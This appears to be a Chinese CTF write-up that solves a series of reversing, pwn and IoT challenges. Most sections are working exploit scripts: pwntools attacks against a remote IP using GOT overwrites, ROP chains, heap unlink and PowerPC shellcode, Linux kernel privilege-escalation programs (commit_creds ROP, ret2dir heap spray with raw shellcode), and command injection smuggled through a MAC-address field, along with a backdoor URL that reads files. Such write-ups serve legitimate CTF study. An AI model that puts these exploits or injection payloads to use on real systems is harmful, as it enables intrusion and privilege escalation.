## Nodemcu

```
String nudemcu.bin | grep -i flag{
```

发现flag去掉flag{	对齐格式并提交即可

6808dcf0-526e-11eb-92de-acde48001122

## decryption

简单加密 脚本如下

```
buf=[0x12, 0x45, 0x10, 0x47, 0x19, 0x49, 0x49, 0x49, 0x1A, 0x4F, 0x1C, 0x1E, 0x52, 0x66, 0x1D, 0x52, 0x66, 0x67, 0x68, 0x67, 0x65, 0x6F, 0x5F, 0x59, 0x58, 0x5E, 0x6D, 0x70, 0xA1, 0x6E, 0x70, 0xA3]

for i in range(32):

    buf[i]^=0x23

    buf[i]^=i

    v4=i

    v3 = 2 * (v4 & buf[i])

    while v3:

        buf[i]^=v3

        v3 = 2 * (v3 & buf[i])

    # print(hex(buf[i]),chr(buf[i]))

print(chr(buf[i]),end="")
```

1e1a6edc1c52e80b539127fccd48f05a

## obfu

同样是加密不过更为复杂多次调试 AES + CR4 + 自定义

```
from Crypto.Cipher import AES
from Crypto.Cipher import ARC4
v8=[0x8C, 0xE5, 0x1F, 0x93, 0x50, 0xF4, 0x45, 0x11, 0xA8, 0x54, 0xE1, 0xB5, 0xF0, 0xA3, 0xFB, 0xCA]
v7=[0x6E, 0xD6, 0xCE, 0x61, 0xBB, 0x8F, 0xB7, 0xF3, 0x10, 0xB7, 0x70, 0x45, 0x9E, 0xFC, 0xE1, 0xB1]
temp=bytes([0x21, 0x23, 0x2F, 0x29, 0x7A, 0x57, 0xA5, 0xA7, 0x43, 0x89, 0x4A, 0x0E, 0x4A, 0x80, 0x1F, 0xC3])

aes = AES.new(bytes(v8), AES.MODE_CBC,iv=bytes(v7))
temp=aes.encrypt(temp)
rc4 = ARC4.new(bytes(v8))
temp=list(rc4.decrypt(temp))
flag=[0]*16
for i in range(16):
    flag[i] = ((temp[(i + 1) % 16]>>5)&0x3f) | ((temp[i] << 3) & 0xff)
print(bytes(flag).hex())
```

0725f66471f85ba9d742eb583c75959c

## emarm

partial overwrite成system

```
from pwn import *
context.log_level="debug"
libc=ELF("./libc.so.6")
#p=process("qemu-aarch64 -g 1234 -L libs ./emarm",shell=True)
p=remote("183.129.189.60",10004)
p.recvuntil("passwd:")
p.sendline("\x00")
p.send(str(0x412020)[:7])
print hex(libc.symbols["atoi"])
p.recvuntil("you will success")
p.send("\xc8\xf2")
p.sendline("sh")
p.interactive()
```
flag{1f16c67b554e9e75300f37e9f08d0aa4}

## justcode
任意地址写，改got
```
from pwn import *
context.log_level="debug"
#libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libc=ELF("./libc-2.23.so")
#p=process("./justcode")
#gdb.attach(p)
p=remote("183.129.189.60",10032)
p.recvuntil("your code:\n")
p.sendline("1")
p.sendline("2")
p.sendline("1")
p.sendline("1")

def add(name):
    p.recvuntil("name:\n")
    p.send(name)

def add2(idx,name):
    p.recvuntil("id:\n")
    p.sendline(str(idx))
    p.recvuntil("info:\n")
    p.send(name)

add("A"*0xC+p32(0x602038)+"C"*0x8)
p.recvuntil("check it : ")
#p.recvuntil("C"*0x8)
#libc_base=u64(p.recv(6)+"\x00\x00")-(0x7f3cdb07dc7a-0x00007f6b44004000)
#print hex(libc_base)

add2(0x400D4B,"ssss")
add("A"*0x18)


#add("A"*0x18)
p.recvuntil("A"*0x18)
libc_base=u64(p.recv(6)+"\x00\x00")-(0x7f616c7d3c7a-0x00007f616c765000)
print hex(libc_base)
add("A"*0x90)

p.recvuntil("your code:\n")
p.sendline("1")
p.sendline("1")
p.sendline("2")
p.sendline("1")

#add("A"*0xC+p32(0x602080)+"C"*0x8)
#add2((libc_base+libc.symbols["gets"])&0xffffffff,"ssss")
add("A"*0x89)
p.recvuntil("A"*0x89)
canary="\x00"+p.recv(7)

p.recvuntil("your code:\n")
p.sendline("1")
p.sendline("2")
p.sendline("1")
p.sendline("1")

add("A"*0xC+p32(0x602080)+"C"*0x8)
add2((libc_base+libc.symbols["gets"])&0xffffffff,"ssss")

add("A"*0x8)

p.sendline("A")
gets=libc_base+libc.symbols["gets"]
fopen=libc_base+libc.symbols["open"]
fread=libc_base+libc.symbols["read"]
fwrite=libc_base+libc.symbols["write"]
pop_rdi=0x0000000000400ea3
pop_rdx=libc_base+0x0000000000001b92
pop_rsi_r15=0x0000000000400ea1
add("A"*0x88)

p.sendline(canary+"C"*8+p64(pop_rdi)+p64(0x06020D8)+p64(gets)+p64(pop_rdi)+p64(0x06020D8)+p64(pop_rsi_r15)+p64(0)+p64(0)+p64(fopen)+p64(pop_rdi)+p64(3)+p64(pop_rsi_r15)+p64(0x06020D8+0x10)+p64(0)+p64(pop_rdx)+p64(0x100)+p64(fread)+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(0x06020D8+0x10)+p64(0)+p64(pop_rdx)+p64(0x100)+p64(fwrite))
p.sendline("flag\x00")

print p.recv(1024)
print p.recv(1024)
```

flag{f79047efe49d10a8001c5791c34f0dbb}

## undlcv

unlink改got表
```
from pwn import *
context.log_level="debug"

#p=process("./undlcv")
#gdb.attach(p)
p=remote("183.129.189.60",10002)
def add(idx):
    p.send("1"+"\x00"*9)

    p.send(str(idx)+"\x00"*9)

def edit(idx,ctx):
    p.send("2"+"\x00"*9)

    p.send(str(idx)+"\x00"*9)
    sleep(1)
    p.send(ctx)
    sleep(1)
    
def delete(idx):
    p.send("3"+"\x00"*9)

    p.send(str(idx)+"\x00"*9)
    
add(0)
add(1)
p.send("4"+"\x00"*9)
edit(0,p64(0)+p64(0xf1)+p64(0x403480-0x18)+p64(0x403480-0x10)+"A"*0xd0+p64(0xf0))
delete(1)
edit(0,p64(0)*3+p64(0x403430))
edit(0,"\x07\x22")
p.interactive()

sudo -u#-1 cat flag

```

DASCTF{e494b6357dc9e2f547ce4b33dcc7aec5}

## ememarm
简单题
```
from pwn import *
context.log_level="debug"

libc=ELF("libc.so.6")
#p=process("qemu-aarch64 -g 1234 -L lib ./ememarm",shell=True)
p=remote("183.129.189.60",10036)


def add(x,y,i):
    p.recvuntil("you choice: \n")
    p.sendline("1")
    p.recvuntil("cx:\n")
    p.send(x)
    p.recvuntil("cy:\n")
    p.send(y)
    p.recvuntil("do you want delete?\n")
    p.sendline(str(i))


def printf(i):
    p.recvuntil("you choice: \n")
    p.sendline("2")
    p.sendline(i)

def delete(i,ctx):
    p.recvuntil("you choice: \n")
    p.sendline("3")
    p.sendline(str(i))
    p.send(ctx)

def add2(x,y,i):
    p.recvuntil("you choice: \n")
    p.sendline("4")
    p.recvuntil("cx:\n")
    p.send(x)
    p.recvuntil("cy:\n")
    p.send(y)
    p.recvuntil("do you want delete?\n")
    p.sendline(str(i))


p.send("B"*0x18)
add("/bin/sh\x00","\x00"*8,1)
add("/bin/sh\x00","A"*8,1)
add(p64(0),p64(0x41),1)
add("A"*8,"A"*8,1)
add("A"*8,"A"*8,1)
add("A"*8,"A"*8,1)
add("A"*8,"A"*8,1)

delete(6,"C"*0x18)
delete(3,p64(0)+p64(0x31)+p32(0x412038))
add2("Z"*8,"\x00"*8,0)

add("Y"*8,"A"*8,1)
delete(5,"G"*0x18)
delete(3,p64(0)+p64(0x31)+p32(0x412038))


add("G"*8,"\x00"*8,0)
add("G"*8,"\x00"*8,0)
add(p64(0x400740),"\x68",1)
delete(3,"G"*0x18)
libc_base=u64(p.recv(3)+"\x00\x40"+"\x00\x00\x00")-(0x40008c8308-0x400085d000)
print hex(libc_base)
print hex(libc_base+libc.symbols["read"])
print hex(libc_base+libc.symbols["system"])
add2(p64(libc_base+libc.symbols["system"]),"\x68",0)
delete(1,"/")
p.interactive()
#add("D"*8,"D"*8,0)
#add("D"*8,"D"*8,0)
#add("D"*8,"D"*8,1)
```
flag{33c34e317026a39feeea14fdd97fa846}

## easy_kernel
逆向

```
from Crypto.Cipher import DES

key = "\x7D\x61\x67\x6C\x66\x5F\x54\x5F"
cipher = "\xB2\xC4\x86\xD5\x54\x6C\x38\xAD\xBD\x69\xD4\xE9\x44\x47\x36\x21\x99\x91\xFB\x13\x70\xD8\x6B\xE4\x80\x12\xE2\x43\x2A\x4B\x49\x8E"
c = [0xB2, 0xC4, 0x86, 0xD5, 0x54, 0x6C, 0x38, 0xAD, 0xBD, 0x69, 0xD4, 0xE9, 0x44, 0x47, 0x36, 0x21, 0x99, 0x91, 0xFB, 0x13, 0x70, 0xD8, 0x6B, 0xE4, 0x80, 0x12, 0xE2, 0x43, 0x2A, 0x4B, 0x49, 0x8E]
for i in range(30,-1,-1):
    c[i] ^= c[i+1]
cipher = ''.join(map(chr,c))
des = DES.new(key,DES.MODE_ECB)
print(des.decrypt(cipher))
```
flag: md5(WelcOme_to_kerne1_world!)

## dd_kernel

ROP即可
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(void){
    system("/bin/sh");
}
//eip =(unsigned long long) get_shell;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void payload(){
      commit_creds(prepare_kernel_cred(0));
}


int main(void){
	save_stats() ; 
	unsigned long long buf[0x200/8];
	memset(buf,0,0x40);
	unsigned long long canary ;
	unsigned long long module_base ;
	unsigned long long vmlinux_base ; 
	unsigned long long iretq ;
	unsigned long long swapgs ;
	unsigned long long rop[0x30];
	memset(buf,0,0x30*8);
	int fd = open("/proc/doudou",O_RDWR);
	if(fd == -1){
		printf("open file error\n");
		exit(0);
	}
	else{
		printf("open file success\n");
	}
	printf("[*] canary: 0x%p",canary);
	printf("[*] module_base: 0x%p",module_base);
	printf("[*] vmlinux_base: 0x%p",vmlinux_base);
	commit_creds = 0x0ffffffff8105d235;
	prepare_kernel_cred = 0xffffffff8105d157;
	iretq = 0xffffffff8136441e;
	swapgs  = 0xffffffff8100c86a;
    rop[0]=0xdeadbeef;
    rop[1]=0xdeadbeef;
    rop[2]=payload;
	rop[3] = swapgs;
	rop[4] = 0;
	rop[5] = iretq ;
	rop[6] = get_shell ; 
	rop[7] = user_cs;
	rop[8] = user_eflags;
	rop[9] = user_sp;
	rop[10] = user_ss;
	rop[11] = 0;

	write(fd,rop,0x107);
}
```

## baby baby call
ret2dir
```
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <pty.h>
#include <signal.h>


#define regcache_mark_dirty 0xffffffff816c3625
#define guess_physmap		0xffff888007a72000
#define mp_size			1024*64 //64K
#define spray_times		64*16	// heap spray size : 64K*64*32 = 128M
#define set_memory_x		0xffffffff8107ed30
unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(void){
    system("/bin/sh");
}
//eip =(unsigned long long) get_shell;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void payload(){
      commit_creds(prepare_kernel_cred(0));
}

void error_quit(char *arg)
{
	puts(arg);
	exit(-1);
}
void heap_spray()
{
	int i = 0,num;
	char *mp;
	char *p;
	for (i = 0; i < spray_times; i++)
	{
        	if ((p = mmap(NULL, mp_size, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0 )) == MAP_FAILED)
                	error_quit("mmap error");
		for (num = 0; num < 64; num++)
		{
			mp = p + num * 1024;/*
			*((unsigned long *)&mp[0]) = 0xAAAAAAAAAAAAAA;
			*((unsigned long *)&mp[0x30]) = guess_physmap+0x40;
			*((unsigned long *)&mp[0x20]) = 0xffffffff8153588e;
			*((unsigned long *)&mp[0xe0]) = 0;
			*((unsigned long *)&mp[0x9e]) = 0xffffffff81608251;
			*((unsigned long *)&mp[0x8]) =  guess_physmap+0x70;
			*((unsigned long *)&mp[0x70]) =  guess_physmap;
			*((unsigned long *)&mp[0x60]) =  set_memory_x;
			*((unsigned long *)&mp[0x68]) =  guess_physmap+0x100;
			*((unsigned long *)&mp[0x270]) =  0xffffffff810a9114;*/
			*((unsigned long *)&mp[0]) = 0xAAAAAAAAAAAAAA;
			*((unsigned long *)&mp[0x30]) = guess_physmap+0x30;
			*((unsigned long *)&mp[0x20]) = set_memory_x;
			*((unsigned long *)&mp[0x28]) = guess_physmap+0x40;
            memcpy(&mp[0x40],"\x48\xc7\xc7\x00\x00\x00\x00\x48\xc7\xc0\x50\xd1\x0b\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x60\xcd\x0b\x81\xff\xd0\x48\xc7\xc7\xf0\x06\x00\x00\x48\xc7\xc2\x48\x00\x00\x00\x48\x8d\x0d\x0b\x00\x00\x00\x51\x55\x48\xc7\xc0\xe0\x09\x02\x81\xff\xe0\x6a\x2b\x48\xc7\xc0\x00\x10\x10\x00\x50\x68\x46\x02\x00\x00\x6a\x33\x68\xdc\x09\x40\x00\x0f\x01\xf8\x48\xcf",87);

	
		}
	}	
}

void get_shell_again(){
  puts("SIGSEGV found");
  puts("get shell again");
  system("id");
  char *shell = "/bin/sh";
  char *args[] = {shell,NULL};
  execve(shell, args, NULL);
}

void handler(int signo, siginfo_t* info, void* vcontext) {}

void debug_enable_sigsev_handler() {
  struct sigaction action;
  memset(&action, 0, sizeof(struct sigaction));
  action.sa_flags = SA_SIGINFO;
  action.sa_sigaction = get_shell_again;
  sigaction(SIGSEGV, &action, NULL);
}

int main(void){
	save_stats() ; 
debug_enable_sigsev_handler();
	unsigned long long buf[0x200/8];
	memset(buf,0,0x40);
	unsigned long long canary ;
	unsigned long long module_base ;
	unsigned long long vmlinux_base ; 
	unsigned long long iretq ;
	unsigned long long swapgs ;
	unsigned long long rop[0x30]={0};
	memset(buf,0,0x30*8);
    char * pp = mmap(0x100000, 0x10000, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,-1, 0);
	int fd = open("/dev/babycall",O_RDWR);
	if(fd == -1){
		printf("open file error\n");
		exit(0);
	}
	else{
		printf("open file success\n");
	}
	printf("[*] canary: 0x%p",canary);
	printf("[*] module_base: 0x%p",module_base);
	printf("[*] vmlinux_base: 0x%p",vmlinux_base);
	commit_creds = 0xffffffff810bcd60;
	prepare_kernel_cred = 0xffffffff810bd150;
    rop[0]=0x0f0e0e0b0d0a0e0d;
    rop[1]=regcache_mark_dirty;
    heap_spray();
    ioctl(fd,65537,rop);
    ioctl(fd,65537,guess_physmap);

}


```

```
mov rdi,0
mov rax,0xffffffff810bd150
call rax
mov rdi,rax
mov rax,0xffffffff810bcd60
call rax
mov rdi,0x6f0
mov rdx,0x48
lea rcx, [rip+11]
push rcx
push rbp
mov rax,0xffffffff810209e0
jmp rax

push 0x2b
mov rax, 0x06CCD00 // new stack
push rax
push 0x246
push 0x33
push 0x4009DC // getshell
swapgs
iretq
```


## easybios
bios逆向
```
  
int main(){
 int v13[256]={0};
int v14[258]={0};

int flag[]={70, 119, 116, 176, 39, 142, 143, 91, 233, 216,  70, 156, 114, 231, 47, 94};
const char* aOvmfAndEasyBio="OVMF_And_Easy_Bios";

for (int i = 0; i != 256; ++i )
  {
    v13[i] = i;
    v14[i] = aOvmfAndEasyBio[i % 18];
  }
  int v2 = 0;
  int v3 = 0;
int v4,v5;
  do
  {
    v4 = v13[v2];
    v3 = (v14[v2] + v4 + v3) % 256;
    v5 = v13[v3];
    v13[v3] = v4;
    v13[v2] = v5;
    ++v2;
  }
  while ( v2 != 256 );
  int v6 = 0;
  int v7 = 0;
  int v8 = 0;
int v9,v10,v11,result;
  do
  {
    v9 = v13[++v8];
    v10 = (v9 + v7) % 256;
    v11 = v13[v10];
    v13[v10] = v9;
    v7 = (v9 + v7) % 256;
    v13[v8] = v11;
    result = (unsigned int)v13[(v11 + v13[v10]) % 256];
    printf("%2x",result^flag[v6]);
	v6++;
  }
  while ( v6 != 16 );
  return result;
}
```

88baec0b5154f859b5851097bb567f5c

## easymsg

先读config.dat得到账号/密码 admin/alexandr1s,然后命令注入

```
from pwn import *
import zlib
import base64
context.log_level="debug"
#p=remote("127.0.0.1",6780)



def payload(code,ctx):
    magic="HwsDDW"
    crc=zlib.crc32(ctx)&0xFFFFFFFF
    result=magic+p16(len(ctx),endian='big')+p16(code,endian='big')+p32(crc,endian='big')+ctx
    return result

s=2
if s==1:
    #mac="8E6359F1bE25:wget"
    #mac="A6371E330DA6:wget;echo \""
    mac="A62EEC8BD6CE:1\";cp flag /tmp/flaz2;echo \"ss"
    p.send(payload(0x102,("leaveName:"+mac).ljust(0x101,"\x00")))
    print base64.b64decode(p.recvuntil("=="))

elif s==2:
    #p.send(payload(0x102,"readFile:./config.dat".ljust(0x101,"\x00")))
    #p.send(payload(0x102,"readFile:./flag2".ljust(0x101,"\x00")))
    #f=open("sb","wb")
    #s=base64.b64decode(p.recv())
    #print s
    #f.write(s)
    #f.close()
    #print base64.b64decode(p.recv())
    #p.send(payload(0x102,"setSystemParam:username:admin\npassword:alexandr1s".ljust(0x101,"\x00")))
    p=remote("183.129.189.60",10014)
    p.send(payload(0x102,"ifconfig:".ljust(0x101,"\x00")))
    s=base64.b64decode(p.recv())
    print s
    s=s[s.find("ether")+5:]
    target=s[s.find("ether")+6:s.find("ether")+5+18]
    target=target.replace(":","")
    mac=target.upper()
    p.close()
    p=remote("183.129.189.60",10014)
    p.send(payload(0x102,"setSystemParam:username:admin\npassword:alexandr1s".ljust(0x101,"\x00")))
    p.close()
    #mac="8E6359F1bE25:wget"
    #mac="A6371E330DA6:wget;echo \""
    p=remote("183.129.189.60",10014)
    mac+=":1\";ls -al / > /tmp/name3;cat /flagG1zjin > /tmp/name4;ls -al /tmp > /tmp/name3 ;echo \"abcdef"
    p.send(payload(0x102,("leaveName:"+mac).ljust(0x101,"\x00")))
    #print base64.b64decode(p.recvuntil("=="))
    p.close()
    sleep(1)
    p=remote("183.129.189.60",10014)
    p.send(payload(0x102,"readFile:/tmp/name4".ljust(0x101,"\x00")))
    print base64.b64decode(p.recvuntil("=="))
    p.close()
else:
    p.send(payload(0x102,"setSystemParam:username:admin\npassword:alexandr1s".ljust(0x101,"\x00")))
```

flag{72ba194e-da1e-4e9c-ba68-719cae2e3ee0}


## BlinkBlink
set_cmd后门读flag
```
183.129.189.60:10037/goform/set_cmd?type=setcmd&cmd=cat%20/home/goahead/flag.txt
```
flag{1369bc64-0de7-4d93-ba01-2fd8aa1c211a}

## PPPPPPC
powerpc栈溢出

```
from pwn import *
context.log_level="debug"


#p=process("./qemu-ppc-static -g 1234 ./PPPPPPC",shell=True)
p=remote("183.129.189.60",10019)
p.recvuntil("Tell me your name: ")
p.sendline("\x7c\x3f\x0b\x78\x7c\xa5\x2a\x79\x42\x40\xff\xf9\x7f\x08\x02\xa6\x3b\x18\x01\x34\x98\xb8\xfe\xfb\x38\x78\xfe\xf4\x90\x61\xff\xf8\x38\x81\xff\xf8\x90\xa1\xff\xfc\x3b\xc0\x01\x60\x7f\xc0\x2e\x70\x44\x00\x01\x62/bin/shZ".ljust(0x13c,"A")+p32(0xf6fffab8,endian="big"))
#p.sendline("|1\x0bxBBBB".ljust(0x13c,"A")+p32(0x100b3390-4,endian="big"))
p.interactive()
```

flag{1f1c0ba7-dba3-47f6-b9a2-9bd1ed6da25d}

##  STM

```
int main(){

char result[48]={0};
unsigned char ida_chars[] =
{
  0x7D, 0x77, 0x40, 0x7A, 0x66, 0x30, 0x2A, 0x2F, 0x28, 0x40, 
  0x7E, 0x30, 0x33, 0x34, 0x2C, 0x2E, 0x2B, 0x28, 0x34, 0x30, 
  0x30, 0x7C, 0x41, 0x34, 0x28, 0x33, 0x7E, 0x30, 0x34, 0x33, 
  0x33, 0x30, 0x7E, 0x2F, 0x31, 0x2A, 0x41, 0x7F, 0x2F, 0x28, 
  0x2E, 0x64, 0x00, 0x00
};
char* p=ida_chars;
char* q=result;
int v2=0;
int v4;
  while ( 1 )
  {
    v2++;
    if ( v2==0x31 )
      break;
    char v3 = *p++;
    *q++ = (v3 ^ 0x1E) + 3;
  }
puts(result);

}
```

flag{1749ac10-5389-11eb-90c1-001c427bd493}